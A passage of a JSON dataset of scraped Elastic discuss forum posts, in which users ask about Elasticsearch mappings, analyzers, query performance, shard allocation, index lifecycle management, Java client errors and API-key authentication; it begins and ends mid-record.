elasticsearch_client.termvectors(index=INDEX_NAME, doc_type=DOC_TYPE, id=fetched_id, offsets=False, fields=[\"plain_text\"], positions=False, payloads=False, term_statistics=True, field_statistics=False) Sample termvector HTTP URL after calling mtermvector API in python http://**servername**/elastic/**indexName**/article/608588/_termvectors?offsets=false&fields=plain_text&field_statistics=false&term_statistics=true&payloads=false&positions=false This request showing unexpected behaviour. I am not able to understand this. One request with HTTP request gives timeout error and next time with the same request it gives proper response Index setting and mapping { \"settings\": { \"analysis\": { \"analyzer\": { \"shingleAnalyzer\": { \"tokenizer\": \"letter_tokenizer\", \"filter\": [ \"lowercase\", \"custom_stop\", \"custom_shingle\", \"custom_stemmer\", \"length_filter\" ] } }, \"filter\": { \"custom_stemmer\": { \"type\": \"stemmer\", \"name\": \"english\" }, \"custom_stop\": { \"type\": \"stop\", \"stopwords\": \"_english_\" }, \"custom_shingle\": { \"type\": \"shingle\", \"min_shingle_size\": \"2\", \"max_shingle_size\": \"4\", \"filler_token\":\"\" }, \"length_filter\": { \"type\": \"length\", \"min\": 2 } }, \"tokenizer\": { \"letter_tokenizer\": { \"type\": \"letter\" } } } }, \"mappings\": { \"properties\": {\"article_id\":{\"type\": \"text\"}, \"plain_text\": { \"term_vector\": \"with_positions_offsets_payloads\", \"store\": true, \"analyzer\": \"shingleAnalyzer\", \"type\": \"text\", \"fields\": { \"keyword\": { \"type\": \"keyword\", \"ignore_above\": 256 } } } } } } I don't think there is any problem with this setting and mapping as sometimes I am getting expected response. Please let me know if you need more information from my side. Any help will be appreciated.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "a12435fd-cfab-49a7-8a60-ca75e7c65e96",
    "url": "https://discuss.elastic.co/t/custom-analyzer-versus-ingest-pipeline/228941",
    "title": "Custom Analyzer versus Ingest Pipeline",
    "category": [
      "Elasticsearch"
    ],
    "author": "gigabyte87",
    "date": "April 20, 2020, 10:36pm April 21, 2020, 2:21am April 21, 2020, 1:32am",
    "body": "Hello, I'm having some trouble playing around with a custom analyzer. I created an index with a custom analyzer to map IT to Italy, and reindexed to the new index. The search features work, I can search \"Italy\" and it finds the documents that contain \"IT\". However, I want to know if the data can/should be manipulated after the reindex to reflect the change. All my documents still show \"IT\". I know I can do this with an ingest pipeline, but I'm wondering why it doesn't work with the analyzers. PUT kibana_sample_data_flights6 { \"settings\": { \"analysis\": { \"char_filter\": { \"IT_filter\": { \"type\": \"mapping\", \"mappings\": \"IT => Italy\" } }, \"analyzer\": { \"content_anaylzer\": { \"tokenizer\": \"keyword\", \"char_filter\": [\"IT_filter\"] } } } }, \"mappings\": { \"properties\": { \"DestCountry\": { \"type\": \"text\", \"analyzer\": \"content_anaylzer\" } } } } POST _reindex { \"source\": { \"index\": \"kibana_sample_data_flights\" }, \"dest\": { \"index\": \"kibana_sample_data_flights6\" } }",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "4095c3df-3c0d-4fc1-a6e4-89d4f6c4c832",
    "url": "https://discuss.elastic.co/t/getting-started-tutorial-errors/228883",
    "title": "Getting Started tutorial errors",
    "category": [
      "Elasticsearch"
    ],
    "author": "Rodrigo_Bezerra",
    "date": "April 20, 2020, 2:23pm April 20, 2020, 9:39pm April 21, 2020, 12:20am April 21, 2020, 12:52am April 21, 2020, 12:52am",
    "body": "Hi, I'm going through (this Elasticsearch's tutorial)[https://www.elastic.co/guide/en/elasticsearch/reference/current/getting-started-index.html#getting-started-batch-processing] but when I try to run the command to bulk import the accounts.json file, I get the following error: \"type\" : \"action_request_validation_exception\", \"reason\" : \"Validation Failed: 1: type is missing;2: type is missing;3: type is missing; (the error is long, and goes up to type 1000 is missing) I have a cluster up locally, I can check it's health and PUT / GET data from it. I have tried checking the file format, replacing the file with another one and, most importantly, removing all but one entry from the file, but the error persists. Can anyone give any suggestions? Cheers.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "1eff6e83-be44-4cbf-8e0d-05f19836966d",
    "url": "https://discuss.elastic.co/t/elasticsearch-odbc/228761",
    "title": "Elasticsearch odbc",
    "category": [
      "Elasticsearch"
    ],
    "author": "youu2020",
    "date": "April 19, 2020, 9:12pm April 20, 2020, 1:08am April 20, 2020, 9:37am April 21, 2020, 12:48am",
    "body": "Hi, trying to configure elasticsearch odbc dsn I get this error image583×540 68.8 KB",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "3fdd92e3-fbe6-4862-a352-b9108f3e8c9a",
    "url": "https://discuss.elastic.co/t/best-way-to-insert-denormalized-data-to-es/228937",
    "title": "Best way to insert denormalized data to ES",
    "category": [
      "Elasticsearch"
    ],
    "author": "ferrari",
    "date": "April 20, 2020, 10:13pm",
    "body": "Hi ElasticTeam, I want to get your expert opinion on what's the most optimal way to solve problem mentioned below: Scenario: App receives data then does some processing writes it to Kafka Topic, which is picked up by Kafka Connector and sent to ElasticSearch via SinkConnector and is then displayed to user on Kibana. Processed Data is of type array of objects, example: { \"Host\": <string>, \"switch\": [{ \"SwitchID\": <integer>, \"portStats\": [{ \"PortID\": <integer>, \"TxPackets\": <integer>, \"TxError\": <integer>, .... }] }] } Initially I started with nested type (also played with flattened type) mapping for above data in ElasticSearch but when I was playing around with it in Kibana, then figured kibana doesn't support nested datatype ( even flattened/object type don't work that well for incoming array of objects data) that well. So now I am thinking of storing the data in denormalized form in ElasticSearch so I can support different visualization of that data in Kibana. So the new mapping template in ES based on de-normalization would look like: { \"template\": \"stats-*\", \"order\": 0, \"settings\": { \"index\": { \"number_of_shards\": 3, \"number_of_replicas\": 2, \"default_pipeline\" : \"addtimestamp\" }, }, \"mappings\": { \"properties\": { \"IngestTimestamp\": {\"type\": \"date\"}, \"host\": {\"type\": \"keyword\"}, \"SwitchID\": {\"type\": \"integer\"}, \"PortID\": {\"type\": \"integer\"}, \"TxPackets\": {\"type\": \"long\"}, \"TxErrors\": {\"type\": \"long\"}, } } } So app's output will be like: [ {\"Host\": \"Foo\", \"SwitchID\":1, \"TxPackets\":65, \"TxErrors\":10}, {\"Host\": \"Foo\", \"SwitchID\":0, \"TxPackets\":165, \"TxErrors\":30} ] If app was directly writing to ES (ElasticSearch) then it could have used _bulk insert API but this data from app is written to Kafka then picked up by Kafka-ES_SinkConnector and sent to ES. And based on the mapping above the write will fail as ES template mapping is not for array of objects. Obviously in app I can write value to Kafka one object at a time but that would not be the most ideal way as way too many network calls (i.e each input to app now converts into '20X' calls as I have atleast 20 objects in array). I want to do this in most optimal way. Is it possible to receive the data in ES in nested way but insert into doc in denormalized way maybe some transformation or something as part of Pipeline (I am using simple pipeline to add timestamp to each record)? If yes then can someone give an example: FYI here is the mapping for nested data type I was using: \"mappings\": { \"properties\": { \"IngestTimestamp\": {\"type\": \"date\"}, \"host\": {\"type\": \"keyword\"}, \"switch\": { \"type\": \"nested\", \"properties\": { \"SwitchID\": {\"type\": \"integer\"}, \"portStats\": { \"type\": \"nested\", \"properties\": { \"PortID\": <integer>, \"TxPackets\": <integer>, \"TxError\": <integer>, } } } } } } Appreciate for your help!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "f0e7b285-719c-4992-ad1f-5745078709b5",
    "url": "https://discuss.elastic.co/t/do-i-need-a-certificate-for-each-node/228505",
    "title": "Do I need a certificate for each node?",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 20, 2020, 9:40pm",
    "body": "",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "f685655f-1bfa-484a-9247-2fc49b24d9d6",
    "url": "https://discuss.elastic.co/t/ilm-rollover-stuck-in-warm-phase/228403",
    "title": "Ilm rollover stuck in warm phase",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 16, 2020, 10:13pm April 20, 2020, 9:06pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "e7d23ecf-7cc6-4f95-a9d0-c4d88333d9c1",
    "url": "https://discuss.elastic.co/t/filtering-search-hits-based-on-the-presence-of-other-search-hits/228935",
    "title": "Filtering search hits based on the presence of other search hits",
    "category": [
      "Elasticsearch"
    ],
    "author": "rrva",
    "date": "April 20, 2020, 9:02pm",
    "body": "If my search in the first round returns search hits of a certain type (having an indexed field called \"type\" set to a specific value) , how can I make the presence of these search hits exclude other search hits which share common properties? Lets say I have two types of documents, tv-shows and episodes, and when a search would result in hits for both the tv-shows and its episodes, and I want to remove the episode hits if the tv-show was among the results. Is this possible? Right now, no parent-child relationship is defined among these entities in the index.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "be1f2561-b1fc-4189-860b-193c96666ade",
    "url": "https://discuss.elastic.co/t/basic-monitoring/228926",
    "title": "Basic monitoring",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 20, 2020, 7:09pm April 20, 2020, 9:12pm",
    "body": "",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "cb3d54d7-4a5e-4559-b1d7-b0e4049446aa",
    "url": "https://discuss.elastic.co/t/very-bad-shard-allocation/228903",
    "title": "Very bad shard allocation",
    "category": [
      "Elasticsearch"
    ],
    "author": "kluvi",
    "date": "April 20, 2020, 4:25pm April 20, 2020, 7:55pm April 20, 2020, 8:40pm",
    "body": "Hi. We have Elasticsearch cluster, which consists from: 3 dedicated servers (A+B+C) 48 threads, 128 GB RAM, 1.8TB SSD 1 instance of master+client node, 10 GB heap size 1 instance of data-node, 30 GB heap size 1 dedicated server (D) 64 threads, 128 GB RAM, 1.8TB SSD 1 instance of data-node, 30GB heap size About 2 weeks ago, some really big performance troubles started. It looks, that the bottleneck is server D. It looks, that there is slow GC,.. so we decided to split the server, so there is currently 2 data-nodes, each with 20GB heap size (shared filesystem, because we dont want to reinstall the server). Unfortunately Elasticsearch decides to allocate as much as possible of data to this 2 nodes, so this server is preasumbly \"totaly in fire\". (d228 is server D) Is there some way, how to tell cluster to not allocate so many data on one node? Or simply rebalance shards based on server load?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "12d9b3e7-cf3d-4687-84b9-5e50c2e1db18",
    "url": "https://discuss.elastic.co/t/selecting-documents-to-search-performance-issues/228928",
    "title": "Selecting documents to search (performance issues)",
    "category": [
      "Elasticsearch"
    ],
    "author": "djmarcus",
    "date": "April 20, 2020, 7:58pm April 20, 2020, 7:48pm",
    "body": "I have an elasticsearch document repository with ~15M documents. Each document has an unique 11-char string field (comes from a mongo DB) that is unique to the document. This field is indexed as keyword. I'm using C#. When I run a search, I want to be able to limit the search to a set of documents that I specify (via some list of the unique field ids). My query text uses bool with must to supply a filter for the unique identifiers and additional clauses to actually search the documents. See example below. To search a large number of documents, I generate multiple query strings and run them concurrently. Each query handles up to 64K unique ids (determined by the limit on terms). In this case, I have 262,144 documents to search (list comes, at run time, from a separate mongo DB query). So my code generates 4 query strings (see example below). I run them concurrently. Unfortunately, this search takes over 22 seconds to complete. When I run the same search but drop the terms node (so it searches all the documents), a single such query completes the search in 1.8 seconds. An incredible difference. So my question: Is there an efficient way to specify which documents are to be searched (when each document has a unique self-identifying keyword field)? I want to be able to specify up to a few 100K of such unique ids. Here's an example of my search specifying unique document identifiers: { \"_source\" : \"talentId\", \"from\" : 0, \"size\" : 10000, \"query\" : { \"bool\" : { \"must\" : [ { \"bool\" : { \"must\" : [ { \"match_phrase\" : { \"freeText\" : \"java\" } }, { \"match_phrase\" : { \"freeText\" : \"unix\" } }, { \"match_phrase\" : { \"freeText\" : \"c#\" } }, { \"match_phrase\" : { \"freeText\" : \"cnn\" } } ] } }, { \"bool\" : { \"filter\" : { \"bool\" : { \"should\" : [ { \"terms\" : { \"talentId\" : [ \"goGSXMWE1Qg\", \"GvTDYS6F1Qg\", \"-qa_N-aC1Qg\", \"iu299LCC1Qg\", \"0p7SpteI1Qg\", ... 4,995 more ... ] } } ] } } } } ] } } }",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c2980fc3-7696-4aba-a3bf-20c431cbf106",
    "url": "https://discuss.elastic.co/t/to-find-delta-difference-between-bucket-aggregations/228913",
    "title": "To find Delta difference between bucket aggregations",
    "category": [
      "Elasticsearch"
    ],
    "author": "anv-ani",
    "date": "April 20, 2020, 6:11pm",
    "body": "I have 2 buckets aggregration for different time interval. i get metrics from different data sources and i get the unique count of metrics i get from different data source. Example my individual bucket aggregation looks like this Bucket 1 (Timestamp: yesterday) {data source1} {unique count 1} {data source 2} {unique count 2} {data source n} {unique count n} Bucket 2 (Timestamp: today) {data source1} {unique count 1} {data source 2} {unique count 2} {data source n} {unique count n} I want to find the delta of unique counts between each data-source across the 2 buckets and plot the delta against the data source. How could i achieve it. ? appreciate any inputs",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "cdf3c96e-20e3-4a54-a45d-d9a598fae033",
    "url": "https://discuss.elastic.co/t/enable-security-by-setting-xpack-security-enabled-to-true-in-the-elasticsearch-yml-file-and-restart-the-node/228912",
    "title": "Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node",
    "category": [
      "Elasticsearch"
    ],
    "author": "opensourcengineer",
    "date": "April 20, 2020, 6:06pm",
    "body": "i am using ES 7.5.2 and the basic license is active. when i am trying to click on the \"stack monitoring\" tab i see the notification as \"Monitoring Request Error\" http 503 and want me to enable the xpack security in the config.yaml file. in the logs i can see the below error: Enable security by setting [xpack.security.enabled] to [true] in the elasticsearch.yml file and restart the node. if i am trying to edit the file elasticsearch in /etc/elasticsearch then the elasticsearch service does not restart. i have 3 node ES cluster on prem.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "67f9fe0a-66b4-4aa7-ae5a-3e58eec86740",
    "url": "https://discuss.elastic.co/t/getting-similarity-scores-by-issuing-mlt-queries-doesnt-work-for-some-documents/228878",
    "title": "Getting similarity scores by issuing MLT-queries doesn't work for some documents",
    "category": [
      "Elasticsearch"
    ],
    "author": "Moiddes",
    "date": "April 20, 2020, 1:59pm April 20, 2020, 3:58pm April 20, 2020, 4:02pm April 20, 2020, 4:06pm",
    "body": "Hi, I have a very basic ES-Setting. All items have just two fields id and content. I want to find the top 20 (or 100) most similar documents for each document in my index by getting their BM25 Score. My understanding is, that this can be achieved by issuing MLT-queries. However, for some documents, I receive less than 20 results, for some even zero. But shouldn't each and every document receive a score, regardless of how poorly it is? Furthermore, I know that there are fairly similar documents in my dataset. So finding 0 or just 4 which are deemed similar is definitely not the answer that I was looking for. To conclude: I want to have the top 20 BM25 Scores for all items in my index regarding the content field. Right now my query looks like this: { 'query': {'more_like_this': {'fields': ['content'], 'like': {'_index': 'war_stories', '_id': 85}, 'min_term_freq': 1, 'min_doc_freq': 1} }, 'from': 0, 'size': 20} The index has roughly 22000 Documents in one local shard. Thanks for any insight.",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "cec2f762-189d-45c9-9bb4-8dc5d57f96d9",
    "url": "https://discuss.elastic.co/t/is-default-spell-checker-available-in-elastic-search/228852",
    "title": "Is default spell checker available in elastic search?",
    "category": [
      "Elasticsearch"
    ],
    "author": "Sagar_jain",
    "date": "April 20, 2020, 11:24am April 20, 2020, 11:39am April 20, 2020, 11:55am April 20, 2020, 12:00pm April 20, 2020, 12:52pm April 20, 2020, 12:55pm April 20, 2020, 1:19pm April 20, 2020, 2:40pm April 20, 2020, 2:54pm April 20, 2020, 3:06pm April 20, 2020, 3:17pm April 20, 2020, 3:54pm",
    "body": "Is default spell checker available in elastic search?",
    "website_area": "discuss",
    "replies": 12
  },
  {
    "id": "8590adf7-3aaa-42ad-a1c7-32aea6512cd7",
    "url": "https://discuss.elastic.co/t/scripted-metric-not-considering-the-data-from-all-shards-showing-in-different-blocks/228896",
    "title": "Scripted Metric not considering the data from all shards . showing in different blocks",
    "category": [
      "Elasticsearch"
    ],
    "author": "anjilinga",
    "date": "April 20, 2020, 3:30pm",
    "body": "Hi All, I have used the below query to get the scripted metric data. but the data is displaying in different shards. Is it possible to get the data in single Array insted of multiple arrays. Query: GET act*/_search { \"query\": { \"bool\": { \"must\": [ { \"range\": { \"starttime\": { \"gte\": \"2019-07-14 23:00:00.000\", \"lte\": \"2019-07-15 22:59:59.000\" } } } ], \"filter\": [ { \"bool\": { \"should\": [ { \"match_phrase\": { \"trunkgroupname\": \"100078012_testingPPIsite/PPIheadertrunk\" } } ] } } ] } }, \"sort\": [ { \"starttime\": { \"order\": \"desc\" }} ], \"size\": 0, \"aggs\": { \"max_outgoing\": { \"scripted_metric\": { \"init_script\" : \"state.transactions = ; state.endtrans=\", \"map_script\" : \"if(doc['direction'] !=0 && doc['direction'].value == 'Originating') {state.transactions.add(doc['starttime'].value.hour6060+doc['starttime'].value.minute60+doc['starttime'].value.second);state.endtrans.add(doc['releasetime'].value.hour6060+doc['releasetime'].value.minute60+doc['releasetime'].value.second);}\", \"combine_script\" : \"return state.transactions\", \"reduce_script\" : \" return states\" } } } } Result: { \"took\" : 157, \"timed_out\" : false, \"_shards\" : { \"total\" : 3, \"successful\" : 3, \"skipped\" : 0, \"failed\" : 0 }, \"hits\" : { \"total\" : { \"value\" : 31, \"relation\" : \"eq\" }, \"max_score\" : null, \"hits\" : }, \"aggregations\" : { \"max_outgoing\" : { \"value\" : [ [ 36715, 39328, 53360, 37958, 36715, 37958, 53360, 36715, 39328, 53360 ], [ 38148, 36715, 38148, 39328, 53360, 38148, 39328, 37958, 38148 ], [ 37958, 53360, 37958, 36715, 38148, 39328 ] ] } } }",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "32368aa4-e02d-4ae0-b1fa-572abf8b77d2",
    "url": "https://discuss.elastic.co/t/can-index-lifecycle-policies-be-defined-on-index-patterns-instead-of-exact-index/227129",
    "title": "Can Index Lifecycle policies be defined on index patterns instead of Exact Index?",
    "category": [
      "Elasticsearch"
    ],
    "author": "",
    "date": "April 8, 2020, 1:07pm April 20, 2020, 8:32am April 20, 2020, 8:32am April 20, 2020, 3:23pm",
    "body": "",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "c4047b4a-aac7-4030-ab3d-47d0a028041f",
    "url": "https://discuss.elastic.co/t/how-to-retrive-all-json-documents-from-index-using-java/228867",
    "title": "How to retrive all Json documents from index using java",
    "category": [
      "Elasticsearch"
    ],
    "author": "vinay123",
    "date": "April 20, 2020, 1:02pm April 20, 2020, 2:45pm",
    "body": "Hello , i want to retrive all the documents from index using java, do we have any query . i want to get entire Json file as object, so that i can access elements which i want ? any possibility ? how i saw some source : https://www.elastic.co/guide/en/elasticsearch/client/java-api/current/scrolling.html but that Url is not working. Thanks for help..!!",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "a65c8ac3-8a10-43d5-afe7-ed7882f97558",
    "url": "https://discuss.elastic.co/t/how-can-i-tune-for-elasticsearch-performance/227063",
    "title": "How can I tune for Elasticsearch performance?",
    "category": [
      "Elasticsearch"
    ],
    "author": "sgonv",
    "date": "April 8, 2020, 7:24am April 8, 2020, 7:34am April 8, 2020, 10:58am April 8, 2020, 11:10am April 8, 2020, 12:27pm April 9, 2020, 4:52am April 9, 2020, 4:55am April 9, 2020, 5:46am April 20, 2020, 2:35pm",
    "body": "Hello, I have the Elasticsearch index with 2 Billion documents. And my Elasticsearch cluster has 2 data node with 32GB memory each. The index looks like below, { \"mappings\": { \"properties\": { \"userName\": { \"type\": \"keyword\" }, \"productName\": { \"type\": \"text\", \"analyzer\": \"korean_nori_analyzer\", \"fields\": { \"standard\": { \"type\": \"text\", \"analyzer\": \"standard\" } } } } }, \"settings\": { \"index\": { \"analysis\": { \"tokenizer\": { \"nori_user_dict\": { \"type\": \"nori_tokenizer\", \"decompound_mode\": \"mixed\" } }, \"analyzer\": { \"korean_nori_analyzer\": { \"type\": \"custom\", \"tokenizer\": \"nori_user_dict\" } } }, \"number_of_shards\": 10 } } } And I used 'userName' field for _routing value. So when I want to find specific user's data, I can find it in only one shard. Each shard size are 20~30GB, so I think that is no problem. But when I took GET _search?routing=user1 operation on my index, it took more than 5 seconds. { \"query\": { \"bool\": { \"must\": [ { \"multi_match\": { \"query\": \"삼다수\", \"fields\": [\"productName\", \"productName.standard\"] } } ], \"filter\": [ { \"term\": { \"userName\": \"user1\" } } ] } } } Although I removed query context, query time easily surpassed 5 seconds. { \"query\": { \"bool\": { \"filter\": [ { \"term\": { \"userName\": \"user1\" } } ] } } } How can I tune performance for my Elasticsearch index? I want to get data within 1 seconds. Is this query time natural for 2 Billion data? And how about increasing shard number 10 to 100? I guess that the more shard number, the faster performance, because I can query on only one shard. Thanks.",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "c0f4845b-787f-4e9a-8e40-fc9cf72cde4d",
    "url": "https://discuss.elastic.co/t/connecting-elastic-search-to-aws-cloudwatch/228785",
    "title": "Connecting elastic search to aws cloudwatch",
    "category": [
      "Elasticsearch"
    ],
    "author": "ilovedonuts",
    "date": "April 20, 2020, 1:03pm",
    "body": "I'm running elasticsearch + kibana + nginx in a aws workspace right now from following ONLY steps three and four in this tutorial. My goal is to get aws cloudwatch logs into elasticsearch/kibana but I'm not sure where to start as all this is new to me. Does elastic provide some tutorials/documentation that might get me going in the right direction?",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "586cf29c-0df4-4899-9ef9-f9b3ce87ede9",
    "url": "https://discuss.elastic.co/t/search-json-field/228864",
    "title": "Search json field",
    "category": [
      "Elasticsearch"
    ],
    "author": "Rhh",
    "date": "April 20, 2020, 12:41pm",
    "body": "How can i search a field containing a json string with Nest/C# ? The filed is called 'message' I would like to get all hits where Data.VehicleID = 2 \"{\"Message\":\"1 forsøk\",\"Data\":{\"User\":{\"DriverID\":\"0\",\"VehicleID\":\"2\",\"CentralCode\":\"\"},\"Booking\":{\"ID\":\"0\",\"Text\":\"\"},\"Sequence\":\"0\",\"FareAmount\":\"0\",\"TipsAmount\":\"0\",\"ExtraAmount\":\"0\",\"CurrencySymbol\":\"\",\"Transaction1\":\"\",\"Transaction2\":\"\",\"TransactionData\":\"\",\"MerchantID\":\"\",\"TerminalID\":\"\",\"ID\":\"\",\"Provider\":\"TPH\",\"Phone\":\"\",\"Timestamp\":\"0\",\"Status\":\"INITIATED\",\"Result\":\"PENDING\"},\"Exception\":{\"Type\":\"DivideByZeroException\",\"Message\":\"Forsøkte å dele med null.\",\"Stack\":[{\"Method\":\"yy\",\"File\":\"Form1.cs\",\"Line\":\"71\",\"Column\":\"13\"},{\"Method\":\"xx\",\"File\":\"Form1.cs\",\"Line\":\"65\",\"Column\":\"13\"},{\"Method\":\".ctor\",\"File\":\"Form1.cs\",\"Line\":\"40\",\"Column\":\"17\"}]},\"System\":{\"Process\":{\"Id\":33332,\"Name\":\"WindowsFormsApp11\"},\"Thread\":{\"Id\":1,\"Name\":\"trilili\",\"Culture\":\"nb-NO\"}}\" Regards",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "4965cb15-5896-4117-852d-07d6b1761428",
    "url": "https://discuss.elastic.co/t/api-key-authentication-for-rest-requests/228862",
    "title": "API Key Authentication for REST Requests",
    "category": [
      "Elasticsearch"
    ],
    "author": "Flaxline",
    "date": "April 20, 2020, 12:33pm",
    "body": "Hi, i have a JavaScript function (using Cypress) which uses REST API to query some data from elasticsearch. For a first version, I handled authentication with username/password as shown below and that worked fine. private readonly elasticDB = { node: 'http://elastic:9200', auth: { username: 'elastic', password: 'changeme' } }; cy.request({ method: 'POST', url: this.elasticDB.node, auth: this.elasticDB.auth, body: body }) Now I want to switch to using API Key instead, but \"RequestError: Error: no auth mechanism defined\" occurs. I changed the auth-JSON to: auth: { apiKey: { id: '<id>', api_key: '<api-key>' } } Can you help me locate the error I'm making, or is it just not possible to use the api-key with the REST request? Thanks!",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "c0d4e6b4-2838-4480-a0d8-17c3c319a9ef",
    "url": "https://discuss.elastic.co/t/how-to-get-average-in-nested-document/228861",
    "title": "How to get average in nested document",
    "category": [
      "Elasticsearch"
    ],
    "author": "abhishek.tripathi",
    "date": "April 20, 2020, 12:31pm",
    "body": "Hi Everyone, I like to use elasticsearch aggregations to achive my task but problem is that my document contains nested object and i want to apply aggregations on nested object. so please help me in it. please find the below sample data and my requirement I have documents like below: [ { \"name\": \"Item 1\", \"resellers\": [ { \"reseller\": \"companyA\", \"price\": 450 }, { \"reseller\": \"companyB\", \"price\": 400 } ] }, { \"name\": \"Item 2\", \"resellers\": [ { \"reseller\": \"companyA\", \"price\": 350 }, { \"reseller\": \"companyB\", \"price\": 400 } ] }, { \"name\": \"Item 3\", \"resellers\": [ { \"reseller\": \"companyA\", \"price\": 450 }, { \"reseller\": \"companyB\", \"price\": 400 } ] } ] I need the average price of each document like [ { \"name\": \"Item 1\", \"Average\": 425 }, { \"name\": \"Item 2\", \"Average\": 375 }, { \"name\": \"Item 3\", \"Average\": 425 } ]",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "3ad1ab20-a6bb-43cd-889f-6a22cc2e074c",
    "url": "https://discuss.elastic.co/t/search-vietnamese-in-elasticserch/228848",
    "title": "Search vietnamese in elasticserch",
    "category": [
      "Elasticsearch"
    ],
    "author": "Tu_n_Ph_m",
    "date": "April 20, 2020, 12:18pm April 20, 2020, 11:43am April 20, 2020, 12:20pm",
    "body": "I am installing plugin https://github.com/duydo/elasticsearch-analysis-vietnamese, but it appears an error like the image below. I could not continue to install it. Please tell me what the error is and why. thanks Screenshot from 2020-04-20 16-31-141600×900 203 KB",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "ed6a4115-c1f4-42c9-b29c-d3ca55148b93",
    "url": "https://discuss.elastic.co/t/elasticsearch-7-6-how-do-i-fix-unassigned-shards-issue/228714",
    "title": "[Elasticsearch 7.6] How do I fix unassigned shards issue",
    "category": [
      "Elasticsearch"
    ],
    "author": "Ahmed_Abdulaleem",
    "date": "April 19, 2020, 8:45am April 19, 2020, 9:06am April 19, 2020, 1:32pm April 19, 2020, 2:09pm April 20, 2020, 9:02am April 20, 2020, 9:57am April 20, 2020, 11:54am April 20, 2020, 12:13pm",
    "body": "Hello, I installed an elastic search cluster consists of 3 nodes. after data had been ingested to the cluster, the status of the cluster became yellow due to unassigned shards issue. image775×362 8.25 KB",
    "website_area": "discuss",
    "replies": 8
  },
  {
    "id": "c74620f0-5b23-45dd-a2d1-db2d1dc6e877",
    "url": "https://discuss.elastic.co/t/how-to-combine-transform-with-rollover/228841",
    "title": "How to combine transform with rollover?",
    "category": [
      "Elasticsearch"
    ],
    "author": "Laurynas",
    "date": "April 20, 2020, 11:42am",
    "body": "Hello, I was not able to find any information if it is possible to rollover transform destination index? I tried and that did not work, but maybe I am missing something. Currently I set destination index to \"foo-00001\" and attach policy to it. Then foo-00002 is created, but transform writes to foo-00001 anyway. So is it possible to My goal is to aggregate data depending on how old it is: for last 2 weeks I want to have date histogram for each hour, for last 3 months - date histogram for each day and so on.",
    "website_area": "discuss",
    "replies": 1
  },
  {
    "id": "ba9b7c10-74c5-45c0-b64b-a78714cf2943",
    "url": "https://discuss.elastic.co/t/null-pointer-exception-in-getrequest-for-index/228800",
    "title": "Null pointer exception in GetRequest for index",
    "category": [
      "Elasticsearch"
    ],
    "author": "vinay123",
    "date": "April 20, 2020, 7:44am April 20, 2020, 8:45am April 20, 2020, 9:15am April 20, 2020, 10:18am April 20, 2020, 10:56am April 20, 2020, 10:58am April 20, 2020, 11:40am",
    "body": "Hello , i am trying to get index from ES using java , below is the code which i have used, but i am getting null values to getrequest obj ,then its throwing null pointer exception RestHighLevelClient restHighLevelClient = new RestHighLevelClient(RestClient.builder( new HttpHost(eshost, esport))); GetRequest getRequest = new GetRequest(\"jsonvalidation\"); // jsonvalidation is my index name please help me with correct code to retrive the index Thanks for help inadvance..!!",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "9df00c12-458c-431d-9243-43a042634910",
    "url": "https://discuss.elastic.co/t/elastic-scoring-for-perfect-match/228720",
    "title": "Elastic Scoring for perfect match",
    "category": [
      "Elasticsearch"
    ],
    "author": "AndyS",
    "date": "April 19, 2020, 10:44am April 19, 2020, 11:49am April 20, 2020, 11:41am April 19, 2020, 1:10pm April 20, 2020, 10:09am April 20, 2020, 10:52am",
    "body": "Hey, I have a JSON query that gives different results when executed in Elastic vs executed in Kibana. In my use case of security log searching perfect matches are the desired answer, so I believe that Kibana is 'right' and Elastic is 'not 100% right' From reading around I believe this is down to Scoring, which looks amazingly powerful, but seems too complicated so I wonder if I'm missing something? The query I use is the creation of a layered approach, so many subqueries are bundled into one master query, here is one example: { \"query\": { \"bool\": { \"must\": [{ \"match\": { \"answers\": \"lgincdn.trafficmanager.net,lgincdnvzeuno.azureedge.net,lgincdnvzeuno.ec.azureedge.net,cs1227.wpc.alphacdn.net,192.229.221.185\" } }, { \"match\": { \"source_ip\": \"192.168.1.10\" } } ], \"filter\": [] } }, \"size\": 10000, \"_source\": [\"*\"] } In elastic I get 18 hits, some of these are not perfect matches In Kibana (query converted to RISON) for the same time frame I get 1 hit Does it sound like I understand the problem correctly, and can someone give me a pointer into the right direction to force perfect matches in Elastic in the simplest way? Many thanks Andy",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "34b0d895-660f-4b1c-aa8d-b295fc356ed7",
    "url": "https://discuss.elastic.co/t/unable-to-create-snapshots-even-though-es-has-read-write-access-to-smb-drive/228832",
    "title": "Unable to create snapshots even though es has read/write access to smb drive",
    "category": [
      "Elasticsearch"
    ],
    "author": "modec",
    "date": "April 20, 2020, 10:12am",
